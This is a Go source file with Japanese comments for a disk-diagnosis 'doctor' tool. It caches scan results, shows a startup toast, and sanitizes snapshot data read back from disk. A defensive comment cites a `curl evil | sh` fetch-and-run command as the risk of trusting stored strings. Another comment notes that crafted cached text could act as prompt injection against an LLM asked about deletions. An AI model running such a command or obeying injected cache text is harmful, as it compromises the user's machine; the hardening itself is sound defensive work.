package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
	"unicode"

	"doctor/cachedir"
	"doctor/disk"
	"doctor/svc"
)

// doctor のディスク診断結果の保存と、起動時トースト (issue 148 の 3 章)。
//
// 起動時には**走査しない**。前回 doctor を開いたときの結果を読むだけ (起動を待たせない要件)。
// だからトーストの数字は必ず過去のスキャン由来で、初回 (結果が無い) は沈黙する。
//
// ⚠️ 保存先は cachedir.Base() (= $XDG_CACHE_HOME/glog)。パスをここに書かない。

const (
	// doctorToastThreshold は起動時トーストを出す解放可能量の下限 (issue 148 の既定 10GB)。
	doctorToastThreshold = int64(10) << 30
	// doctorToastCooldown は一度出したら再表示しない期間。毎起動出すと無視されるようになり通知の意味が消える。
	doctorToastCooldown = 3 * 24 * time.Hour
	// doctorStaleAfter を超えた結果には「N 日前の診断」を添える。古くても数字は出す (隠すと放置しているときほど
	// 無言になり、この機能が解こうとしている「気づけない」問題を再現する)。
	doctorStaleAfter = 7 * 24 * time.Hour
	// doctorCarryTTL は「今回実測していないエントリの数字を、前回のキャッシュから引き継いでよい」期間。
	// 🚨 上限が無いと**無期限に延命する**: 中断 (Esc) のたびに前回の記録を敷き直すので、
	// 「重いので毎回 Esc の前にたどり着けない」エントリは一度も検証されないまま残り続け、
	// 実体が消えていても検出する手段が構造上無くなる (敵対レビュー 2026-09-03 で実測:
	// 10 回連続で書き込みが成功しても 44GB のエントリが一度も減衰しなかった)。
	// 再利用 (doctorHeavyReuseTTL = 1 時間) より緩くしてよい: あちらは「走査を省く」判断で、
	// こちらは「走査が届かなかった記録を残す」判断なので、日をまたぐ Esc の連続に耐える必要がある。
	doctorCarryTTL = 24 * time.Hour
)

// doctorDiskCache は保存する形。エントリは表示に要る最小限 (トーストの上位 2 件と合計)。
type doctorDiskCache struct {
	ScannedAt      time.Time              `json:"scanned_at"`
	Partial        bool                   `json:"partial"` // Esc で中断した部分結果
	Total          int64                  `json:"total"`   // 今消せる量 (disk.Report.Total)
	Entries        []doctorDiskCacheEntry `json:"entries"` // 占有量の降順
	LastNotifiedAt time.Time              `json:"last_notified_at"`
	// Failed は「診断できなかった」エントリ数。0 に畳むとトーストが黙るので数えて持つ (issue 173)。
	Failed int `json:"failed,omitempty"`
	// Reused は「前回の計測値を引き継いだエントリを含む」印 (記録用。この値だけを見て
	// 書く / 書かないを決めない — 決めると凍結する。doctorCacheFromReport のコメントを参照)。
	// 旧いキャッシュには無いので、欠けていれば false。
	Reused bool `json:"reused,omitempty"`
}

type doctorDiskCacheEntry struct {
	ID     string `json:"id"`
	Label  string `json:"label"`
	Size   int64  `json:"size"`
	Status string `json:"status"`
	// MeasuredAt はこの数字を**実測した**時刻。carry-forward (中断で今回触れなかったエントリ /
	// 再利用したエントリ) に鮮度の上限を持たせるために要る (doctorCarryTTL)。
	// 旧いキャッシュには無いので、ゼロなら prev.ScannedAt を代わりに使う。
	MeasuredAt time.Time `json:"measured_at,omitempty"`
}

func doctorDiskCachePath() (string, error) {
	base, err := cachedir.Base()
	if err != nil {
		return "", err
	}
	return filepath.Join(base, "doctor-disk.json"), nil
}

// doctorCacheFromReport は保存する形に落とす。候補 0 件のエントリは持たない。
//
// 🚨 **再利用 (Reused) した計測値はトーストの材料にしない** (issue 172): 行には「N 分前の計測を再利用」の
// 注記が付くが、トーストには無い。実体を消した後も最大 1 時間「解放できます」と言い続け、
// 「開けば直る」も効かない (トーストは次に doctor を開くまで更新されない)。
//
// 代わりに**前回のキャッシュのそのエントリを引き継ぐ**。前回の値は「最後に実測したときの値」で、
// 再利用中の行が出しているのと同じ古さの情報なので、トーストの意味 (最後に実測した値) と合う。
//
// ⚠️ 「Reused が 1 件でもあれば結果ごと書かない」にしてはいけない。`doctorReuseFrom` の 1 時間は
// **各エントリが実測されるたびにリセットされる**ので、重いエントリが 2 件以上あって実測時刻が
// 互い違いだと「常にどれか 1 件が再利用対象」の状態が持続し、キャッシュが恒久的に凍結する
// (敵対レビュー 2026-09-03 で実測: 20 分おきに 6 時間・18 回開いても一度も更新されず、
// 軽いエントリが 1GB → 100GB に激増しても反映されなかった)。エントリ単位でマージする。
// carryFresh は「今回実測していないエントリの数字を引き継いでよいか」。実測時刻が無い旧いキャッシュは
// キャッシュ全体の ScannedAt で代用する。未来の時刻は引き継がない (他の age 判定と同じ規律)。
func carryFresh(e doctorDiskCacheEntry, prevScannedAt, now time.Time) bool {
	at := e.MeasuredAt
	if at.IsZero() {
		at = prevScannedAt
	}
	if at.IsZero() {
		return false // 実測時刻が分からないものは引き継がない
	}
	// ⚠️ 未来の時刻 (時計を戻した / 別マシンのキャッシュ) は**引き継ぐ**。他の age 判定
	// (cooledDown / loadDoctorSnapshot / doctorReuseFrom) は「作業を省いてよいか / 黙ってよいか」を
	// 決めるので未来を疑う側 = 安全側だが、ここは「記録を残してよいか」なので**残す側が安全**。
	// 引き継ぎ続けるわけでもない: 時計のズレが過ぎれば age は正になり、TTL で切れる。
	return now.Sub(at) < doctorCarryTTL
}

func doctorCacheFromReport(rep disk.Report, prev doctorDiskCache) doctorDiskCache {
	c := doctorDiskCache{ScannedAt: rep.ScannedAt, Partial: rep.Partial, LastNotifiedAt: prev.LastNotifiedAt}
	prevByID := map[string]doctorDiskCacheEntry{}
	for _, e := range prev.Entries {
		prevByID[e.ID] = e
	}
	merged := map[string]doctorDiskCacheEntry{}
	var ids []string
	put := func(e doctorDiskCacheEntry) {
		if _, dup := merged[e.ID]; !dup {
			ids = append(ids, e.ID)
		}
		merged[e.ID] = e
	}
	// 中断した部分結果は**前回の記録に重ねる**。洗い替えにすると、今回走査が届かなかった
	// エントリの値と「診断できず」件数が消える (敵対レビュー 2026-09-03 で実測: 合計が前回より
	// 大きい partial は書いてよい仕様なので、大きいエントリを 1 つ測った直後に Esc すると
	// 恒久 failed の記録まで failed=0 に化けた)。完走した結果はカタログを一巡しているので
	// 重ねる必要が無く、消えたエントリはそのまま消してよい。
	if rep.Partial {
		for _, e := range prev.Entries {
			if carryFresh(e, prev.ScannedAt, rep.ScannedAt) {
				put(e)
			}
		}
	}
	for _, r := range rep.Results {
		if r.Reused {
			// 今回は実測していない。前回の実測値があればそれを引き継ぐ (無ければ持たない)
			if e, ok := prevByID[r.Entry.ID]; ok && carryFresh(e, prev.ScannedAt, rep.ScannedAt) {
				e.Label = r.Entry.Label // 表示文言だけは今のカタログに合わせる
				put(e)
			}
			c.Reused = true
			continue
		}
		if r.Status == disk.StatusOK && len(r.Items) == 0 {
			delete(merged, r.Entry.ID) // 候補が無くなった
			continue
		}
		put(doctorDiskCacheEntry{ID: r.Entry.ID, Label: r.Entry.Label, Size: r.Size, Status: string(r.Status), MeasuredAt: r.MeasuredAt})
	}
	for _, id := range ids {
		e, ok := merged[id]
		if !ok {
			continue
		}
		c.Entries = append(c.Entries, e)
		switch e.Status {
		case string(disk.StatusOK):
			c.Total += e.Size
		case string(disk.StatusFailed):
			c.Failed++
		}
	}
	sort.SliceStable(c.Entries, func(a, b int) bool { return c.Entries[a].Size > c.Entries[b].Size })
	return c
}

// saveDoctorDiskCache は atomic (temp + rename) に書く。中断で壊れたキャッシュを残さない。
func saveDoctorDiskCache(c doctorDiskCache) error {
	path, err := doctorDiskCachePath()
	if err != nil {
		return err
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	data, err := json.Marshal(c)
	if err != nil {
		return err
	}
	tmp := fmt.Sprintf("%s.tmp.%d", path, os.Getpid())
	if err := os.WriteFile(tmp, data, 0o600); err != nil {
		return err
	}
	if err := os.Rename(tmp, path); err != nil {
		_ = os.Remove(tmp)
		return err
	}
	return nil
}

// loadDoctorDiskCache は保存結果を返す。欠損・破損は「結果なし」(起動を失敗させない。クラッシュもしない)。
func loadDoctorDiskCache() (doctorDiskCache, bool) {
	path, err := doctorDiskCachePath()
	if err != nil {
		return doctorDiskCache{}, false
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return doctorDiskCache{}, false
	}
	var c doctorDiskCache
	if err := json.Unmarshal(data, &c); err != nil || c.ScannedAt.IsZero() {
		return doctorDiskCache{}, false
	}
	return c, true
}

// markDoctorNotified は再通知抑止の時刻を記録する (トーストを出した直後に呼ぶ)。
func markDoctorNotified(now time.Time) {
	c, ok := loadDoctorDiskCache()
	if !ok {
		return
	}
	c.LastNotifiedAt = now
	_ = saveDoctorDiskCache(c)
}

// doctorStartupToast は起動時トーストの文面 ("" = 出さない)。純関数 (ファイルは読まない)。
//
//   - 結果が無い → 出さない (初回は沈黙する。起動時に走査しない以上、出せる数字が無い)
//   - 合計が閾値未満 → 出さない (静かであることを既定にする)
//   - 前回の通知から cooldown 内 → 出さない
//   - 7 日超 → 文末に (N 日前の診断) を添える。数字は出す
//
// 文面は「合計」「上位 2 件」「どこを開けばいいか」だけ。トーストにアクションは持たせず文言で D へ誘導する
// (ユーザー決定 2026-09-02)。
func doctorStartupToast(c doctorDiskCache, ok bool, now time.Time) string {
	if !ok {
		return ""
	}
	// 閾値未満でも「診断できず」が在れば黙らない (issue 173 / sinking silently の禁止)。
	// 数字が出せないことと、何も問題が無いことは別。
	if c.Total < doctorToastThreshold {
		if c.Failed == 0 || cooledDown(c, now) {
			return ""
		}
		return fmt.Sprintf("%d 件を診断できませんでした (解放量は未確定) — D で doctor を開く", c.Failed)
	}
	if cooledDown(c, now) {
		return ""
	}
	text := disk.HumanSize(c.Total) + " 解放できます"
	if tops := doctorTopEntries(c, 2); tops != "" {
		text += " (" + tops + ")"
	}
	if c.Failed > 0 {
		text += fmt.Sprintf("、%d 件は診断できず", c.Failed)
	}
	text += " — D で doctor を開く"
	if age := now.Sub(c.ScannedAt); age > doctorStaleAfter {
		text += fmt.Sprintf(" (%d 日前の診断)", int(age.Hours()/24))
	}
	return text
}

// cooledDown は「前回の通知から cooldown 内」か。
// age < 0 (LastNotifiedAt が未来) は cooldown 明けとして扱う。時計を戻した / NTP の大補正 /
// 別マシンのキャッシュを持ってきた後に永久沈黙するのを防ぐ (issue 174)。
// loadDoctorSnapshot と doctorReuseFrom も同じ規律 (age < 0 を弾く) なので、ここだけ非対称にしない。
func cooledDown(c doctorDiskCache, now time.Time) bool {
	age := now.Sub(c.LastNotifiedAt)
	return !c.LastNotifiedAt.IsZero() && age >= 0 && age < doctorToastCooldown
}

// doctorTopEntries は ok の上位 n 件を "Xcode 17.6GB / npm 20.9GB ほか" の形にする。
func doctorTopEntries(c doctorDiskCache, n int) string {
	var parts []string
	rest := 0
	for _, e := range c.Entries {
		if e.Status != string(disk.StatusOK) || e.Size == 0 {
			continue
		}
		if len(parts) < n {
			parts = append(parts, e.Label+" "+disk.HumanSize(e.Size))
		} else {
			rest++
		}
	}
	if len(parts) == 0 {
		return ""
	}
	s := parts[0]
	for _, p := range parts[1:] {
		s += " / " + p
	}
	if rest > 0 {
		s += " ほか"
	}
	return s
}

// doctorSnapshotTTL は「開いたときに前回の結果をそのまま出す」期間。C-g の popup を高頻度で開閉すると毎回
// スキャンが走って見えるので、直近の完全な結果はこの間そのまま出し、r で明示的に走査し直す (ユーザー要望 2026-09-02)。
const doctorSnapshotTTL = 5 * time.Minute

// doctorSnapshot は doctor 画面の 3 セクションの完全な結果 (トースト用の doctor-disk.json とは別ファイル。
// あちらは合計と上位だけの軽い要約で、こちらは画面をそのまま再現するための全体)。
type doctorSnapshot struct {
	ScannedAt time.Time        `json:"scanned_at"`
	Disk      disk.Report      `json:"disk"`
	Svc       svc.Report       `json:"svc"`
	Brew      brewDoctorResult `json:"brew"`
}

func doctorSnapshotPath() (string, error) {
	base, err := cachedir.Base()
	if err != nil {
		return "", err
	}
	return filepath.Join(base, "doctor-snapshot.json"), nil
}

// saveDoctorSnapshot は完全な結果だけを書く (partial は書かない。開き直しで中断の姿を再現しない)。atomic。
func saveDoctorSnapshot(sn doctorSnapshot) error {
	if sn.Disk.Partial || sn.Svc.Interrupted {
		return nil
	}
	path, err := doctorSnapshotPath()
	if err != nil {
		return err
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	data, err := json.Marshal(sn)
	if err != nil {
		return err
	}
	tmp := fmt.Sprintf("%s.tmp.%d", path, os.Getpid())
	if err := os.WriteFile(tmp, data, 0o600); err != nil {
		return err
	}
	if err := os.Rename(tmp, path); err != nil {
		_ = os.Remove(tmp)
		return err
	}
	return nil
}

// loadDoctorSnapshot は TTL 内の完全な結果を返す。欠損・破損・期限切れ・未来の時刻は「無し」(走査に倒す)。
func loadDoctorSnapshot(now time.Time) (doctorSnapshot, bool) {
	sn, ok := loadDoctorSnapshotAny()
	if !ok {
		return doctorSnapshot{}, false
	}
	if age := now.Sub(sn.ScannedAt); age < 0 || age >= doctorSnapshotTTL {
		return doctorSnapshot{}, false
	}
	return sn, true
}

// loadDoctorSnapshotAny は期限を見ずに読む (重いエントリの再利用判定は個々の MeasuredAt で行うため)。
func loadDoctorSnapshotAny() (doctorSnapshot, bool) {
	path, err := doctorSnapshotPath()
	if err != nil {
		return doctorSnapshot{}, false
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return doctorSnapshot{}, false
	}
	var sn doctorSnapshot
	if err := json.Unmarshal(data, &sn); err != nil || sn.ScannedAt.IsZero() {
		return doctorSnapshot{}, false
	}
	sn.Disk.Results = sanitizeSnapshotResults(sn.Disk.Results, timeNow())
	sn.Disk.Total = disk.SumDeletable(sn.Disk.Results)
	// サービス節と brew 節も同じ境界を通す。サービスの Commands は「手で実行してください」と
	// 提示して Y でコピーさせるので、保存された文字列をそのまま信じると `curl evil | sh` を
	// コピー経路に載せられる (issue 178 の敵対レビューが再現した)
	sn.Svc = svc.SanitizeRestored(sn.Svc)
	sn.Brew = sanitizeRestoredBrew(sn.Brew)
	return sn, true
}

// sanitizeRestoredBrew は保存から読み戻した brew doctor の結果を絞る (issue 178)。
// 警告本文は `brew doctor` の自由文なので中身は検査できないが、**形**は固定できる:
// `Warning:` で始まる塊だけを残し、制御文字 (ANSI エスケープ・復帰) を落として長さと件数を切る。
// これで「UI の行構造を偽装する」「画面を埋め尽くす」は防げる。
//
// ⚠️ 残った本文は依然としてキャッシュファイルの書き手が決められる文字列で、`Y` のコピー文にも乗る。
// brew 節にはコマンドの提示が無く (④ の削除対象でもない) ので、ここは形の検査に留めて
// 「中身は信用していない」ことを記録する。中身まで断つなら復元をやめて毎回 brew doctor を回すことになり、
// TTL 内の開き直しを速くするというこの機能の目的と衝突する。
func sanitizeRestoredBrew(b brewDoctorResult) brewDoctorResult {
	out := brewDoctorResult{Clean: b.Clean, Unavailable: cleanBrewText(b.Unavailable)}
	for i, w := range b.Warnings {
		if i >= maxRestoredBrewWarnings {
			break
		}
		if !strings.HasPrefix(w, "Warning:") {
			continue
		}
		out.Warnings = append(out.Warnings, cleanBrewText(w))
	}
	if len(out.Warnings) == 0 && !out.Clean && out.Unavailable == "" {
		return brewDoctorResult{} // 何も残らなかった = 復元しない (走査に倒す)
	}
	return out
}

// cleanOneLine は「1 件が 1 行として描かれる」自由文を絞る (改行も落とす)。
func cleanOneLine(s string) string {
	var b strings.Builder
	for _, r := range s {
		if unicode.IsPrint(r) { // 改行・タブ・ANSI エスケープはすべて非印字なので落ちる
			b.WriteRune(r)
		}
		if b.Len() >= maxRestoredBrewText {
			break
		}
	}
	return b.String()
}

// cleanOneLineList は自由文の一覧を絞る (件数と 1 件あたりの長さ、改行)。
func cleanOneLineList(ss []string) []string {
	if len(ss) == 0 {
		return nil
	}
	out := make([]string, 0, len(ss))
	for i, s := range ss {
		if i >= maxRestoredListItems {
			break
		}
		out = append(out, cleanOneLine(s))
	}
	return out
}

const (
	maxRestoredListItems    = 200
	maxRestoredBrewWarnings = 50
	maxRestoredBrewText     = 4000
)

// cleanBrewText は改行だけ残して他の制御文字を落とし、長さを切る (警告本文は複数行が正常)。
func cleanBrewText(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r == '\n' || unicode.IsPrint(r) { // タブは通さない (dispWidth は幅 0 と数えるが端末は進む)
			b.WriteRune(r)
		}
		if b.Len() >= maxRestoredBrewText {
			break
		}
	}
	return b.String()
}

// doctorSnapshotInCatalog は実効カタログに無い ID の Result を落とす。「カタログから消えた ID …
// 4.7GB ✅ 安全」という行を snapshot から作れてしまうのを塞ぐ (doctorReuseFrom は ID で引くので
// 同じ規律になっており、復元経路だけが緩かった)。実効カタログはテストが差し替えるので、
// 既定カタログを前提にせず呼び出し側から渡す。
func doctorSnapshotInCatalog(rs []disk.Result, has func(string) bool) []disk.Result {
	out := make([]disk.Result, 0, len(rs))
	for _, r := range rs {
		if has(r.Entry.ID) {
			out = append(out, r)
		}
	}
	return out
}

// sanitizeSnapshotResults は snapshot 由来の Result を「信用してよい形」に絞る (issue 178)。
//
// 🚨 **信頼境界**: `doctor-snapshot.json` は一般ユーザー権限で書き換えられる。今は削除機能が無いので
// 実害は表示だけだが、④ (削除) はこの画面の行を対象にする設計なので、境界をここで確定しておく。
// 細工した JSON の任意パスが行・y のコピー・合計・次の snapshot への書き戻しに載ってはいけない。
//
// 落とすもの:
//   - **未知の Status** — ok / blocked / failed 以外は「✅ 安全 + サイズ表示」に化けていた。
//     判定できないものを緑にしない
//   - **負のサイズ** — 「-5B 解放可能」と表示されていた (Result と Item の両方を見る)
//   - **未来の MeasuredAt** — reuse 側は age<0 を弾くのに復元側は素通りだった (非対称)
//
// 残すものには **FromSnapshot=true** を立てる。snapshot 復元経路では Result 側に「走査していない」
// 印が無く、それを示すのは view の snapshotAt だけ = Result 単位では区別できなかった。
// ④ は「印が立っている行は削除の前に必ず再スキャンする」という不変条件にするので、Result 側に要る。
// ⚠️ **Reused を流用してはいけない**。Reused は「重いエントリの計測値を前回から引き継いだ」という
// 別の意味を既に持ち、行の「N 分前の計測を再利用」注記を出している。流用すると普通の開き直しで
// 嘘の注記が全行に出る (敵対レビュー 2026-09-03 で実測: `-1113 分前の計測を再利用`)。
func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
	out := make([]disk.Result, 0, len(rs))
	for _, r := range rs {
		switch r.Status {
		case disk.StatusOK, disk.StatusBlocked, disk.StatusFailed:
		default:
			continue
		}
		if r.Size < 0 {
			continue
		}
		neg := false
		for _, it := range r.Items {
			if it.Size < 0 {
				neg = true
			}
		}
		if neg {
			continue
		}
		if !r.MeasuredAt.IsZero() && now.Sub(r.MeasuredAt) < 0 {
			continue
		}
		// 自由文も絞る: diskCopyText は「別セッションの LLM に消してよいか聞く」形を作るので、
		// 細工した Reason / Failures / Contents はそのまま prompt injection の材料になる
		// (敵対レビュー 2026-09-03)。制御文字を落として長さと件数を切る
		// ⚠️ **改行も落とす**。brew の警告は「(N 行)」の塊として畳んで出すので改行が正常だが、
		// ディスク節の Reason / Failures / Contents は**1 件が 1 行**として描かれる。改行が残ると
		// doctorRow.text の中に改行が入り、幅を数えるテスト (dispWidth) を素通りしたまま
		// 固定高のパネルの行数が実際には増える (敵対レビュー 2026-09-03)。
		// 同じ helper を「畳む側」と「1 行の側」で共用しないこと
		r.Reason = cleanOneLine(r.Reason)
		r.Failures = cleanOneLineList(r.Failures)
		r.Contents = cleanOneLineList(r.Contents)
		r.FromSnapshot = true // 走査していない印 (④ の削除は必ず再スキャンを通す)
		out = append(out, r)
	}
	return out
}

// 重いエントリの再利用 (ユーザー要望 2026-09-02: スキャンはディスク I/O を食うので、明らかに重いものを何度も
// 測り直さない)。前回の計測に doctorHeavyElapsed 以上かかったエントリは、計測から doctorHeavyReuseTTL 以内なら
// 走査せず前回の値を出す (行に「前回の計測を再利用」と添える)。r は全部測り直す。
// 軽いエントリ (数十 ms) は毎回測る: 再利用しても得るものが無く、古い値を出す損だけが残る。
const (
	doctorHeavyElapsed  = 2 * time.Second
	doctorHeavyReuseTTL = time.Hour
)

// doctorReuseFrom は snapshot から「再利用してよい前回結果」を返す関数を作る (disk.Options.Reuse 用)。
// 対象は Status ok で、走査に成功したもの (failed / blocked / partial は毎回測り直す)。
func doctorReuseFrom(sn doctorSnapshot, ok bool, now time.Time) func(disk.Entry) *disk.Result {
	if !ok || sn.Disk.Partial {
		return nil
	}
	byID := map[string]disk.Result{}
	for _, r := range sn.Disk.Results {
		if r.Status != disk.StatusOK || r.Elapsed < doctorHeavyElapsed || r.MeasuredAt.IsZero() {
			continue
		}
		if age := now.Sub(r.MeasuredAt); age < 0 || age >= doctorHeavyReuseTTL {
			continue
		}
		byID[r.Entry.ID] = r
	}
	if len(byID) == 0 {
		return nil
	}
	return func(e disk.Entry) *disk.Result {
		if r, ok := byID[e.ID]; ok {
			r.Entry = e // 表示文言はカタログの今の定義に合わせる (計測値だけを再利用)
			return &r
		}
		return nil
	}
}
